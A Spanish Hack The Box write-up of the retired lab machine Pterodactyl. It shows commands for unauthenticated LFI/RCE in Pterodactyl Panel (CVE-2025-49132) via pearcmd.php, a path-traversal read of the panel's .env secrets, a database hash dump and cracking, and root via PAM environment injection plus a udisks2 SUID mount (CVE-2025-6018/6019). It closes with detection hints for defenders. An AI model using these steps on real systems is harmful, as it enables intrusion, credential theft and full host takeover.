---
machine: Pterodactyl
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, opensuse, pterodactyl, cve-2025-49132, pearcmd, polkit, udisks2]
---

# Pterodactyl — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

**openSUSE Leap 15.6** con el panel **Pterodactyl 1.11.10** en `panel.pterodactyl.htb`. La CVE-2025-49132 permite **LFI/RCE sin autenticar** en `/locales/locale.json`; encadenada con `pearcmd.php` escribe un webshell y ejecuta como `wwwrun`, y de paso filtra las credenciales de la base de datos. Con MariaDB se vuelca la tabla de usuarios, se crackea el hash bcrypt de `phileasfogg3` y se entra por SSH. Root con la cadena **CVE-2025-6018 + CVE-2025-6019**: PAM/Polkit y `udisks2` sin `nosuid`.

## Reconocimiento

```bash
nmap -p- --min-rate 3500 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 9.6p1 (openSUSE Leap 15.6)
80/tcp  http  nginx 1.21.5
```

```bash
curl -s http://<IP>/changelog.txt
```

```text
[Installed] Pterodactyl Panel v1.11.10
```

También hay un `phpinfo.php` expuesto. Enumeración de vhosts:

```bash
ffuf -u http://<IP>/ -H "Host: FUZZ.pterodactyl.htb" -w <wordlist> -fs <tamaño_base>
```

```text
pterodactyl.htb        -> landing de Minecraft
panel.pterodactyl.htb  -> panel Pterodactyl v1.11.10
```

## Acceso: CVE-2025-49132

`/locales/locale.json` usa los parámetros `locale` y `namespace` para construir una ruta que acaba en `require()`, sin normalizar. Se usa un PoC público ajustando la ruta de PEAR de openSUSE (suele necesitar más `../` que en Debian):

```bash
python3 poc.py panel.pterodactyl.htb "echo <base64> | base64 -d | bash"
```

El mismo fallo lee ficheros del panel:

```bash
curl -s "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../../var/www/pterodactyl&namespace=.env"
```

Del `.env` y de `config/database.php` salen `APP_KEY`, usuario y contraseña de MariaDB. La cadena con **PEAR** es la que da ejecución: `pearcmd.php` acepta argumentos por query string (`register_argc_argv`) y escribe un fichero PHP en el webroot, que después se incluye. La shell vuelve como **`wwwrun`**.

## De wwwrun a usuario

```bash
mysql -h 127.0.0.1 -u pterodactyl -p'<password>' panel
```

```sql
select email, username, password from users;
```

El hash bcrypt de `phileasfogg3` cae con John:

```bash
john --wordlist=rockyou.txt hash.txt
```

La contraseña está reutilizada en SSH:

```bash
ssh phileasfogg3@<IP>
cat ~/user.txt
```

En `/var/mail/` hay un correo que menciona la cadena de escalada de udisks, la pista del siguiente paso.

## Escalada: CVE-2025-6018 + CVE-2025-6019

La primera pieza es específica de SUSE: `pam_env` procesa `~/.pam_environment` **antes** de `pam_systemd`, así que se pueden inyectar `XDG_SEAT` y `XDG_VTNR` y hacer que Polkit trate la sesión SSH como una consola local (`allow_active`).

```bash
cat > ~/.pam_environment <<'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```

Con esos permisos `allow_active` se usa la segunda pieza: `udisks2` monta sistemas de ficheros a través de `libblockdev` sin `nosuid`, así que una imagen XFS preparada con un binario SUID de root se monta y se ejecuta:

```bash
# imagen XFS con /root-shell SUID ya preparada
udisksctl loop-setup -f rootfs.img
udisksctl mount -b /dev/loop0
/run/media/<usuario>/<uuid>/root-shell -p
```

```text
uid=0(root)
```

Con root se leen `/root/root.txt` y la flag de usuario ya obtenida.

## Lecciones

- Un panel de terceros sin actualizar con CVE crítica sin autenticar es el punto de entrada, y el `changelog.txt` dice la versión exacta.
- El LFI no solo lee: con `pearcmd.php` y `register_argc_argv` escribe y ejecuta.
- Las credenciales de la base de datos del panel son la vía al hash bcrypt, y la reutilización de contraseña hace el resto.
- En SUSE, PAM y Polkit no se comportan como en Debian: `pam_env` antes de `pam_systemd` convierte una sesión remota en local.
- Detección: peticiones a `/locales/locale.json` con `../`, escrituras en el webroot y montajes de loop devices desde una cuenta web.
